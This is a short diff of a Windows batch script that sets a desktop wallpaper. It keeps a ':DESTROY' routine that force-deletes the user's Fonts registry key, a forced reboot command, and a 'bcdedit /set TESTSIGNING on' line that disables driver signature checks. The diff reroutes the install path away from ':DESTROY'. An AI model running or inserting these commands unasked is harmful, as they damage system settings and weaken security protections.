@@ -173,7 +173,7 @@ echo,
 wmic os where primary=1 reboot
 :DESTROY
 REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Fonts /f
-GOTO AAAAJJ
+GOTO eeee
 :MAININSTALLB
 cls
 echo .....................................................
@@ -194,7 +194,7 @@ goto eeee
 bcdedit /set TESTSIGNING on
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %CD%\walp.bmp /f
 RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
-goto DESTROY
+goto AAAAJJ
 :AAAAJJ
 echo,
 echo Something Happened :)
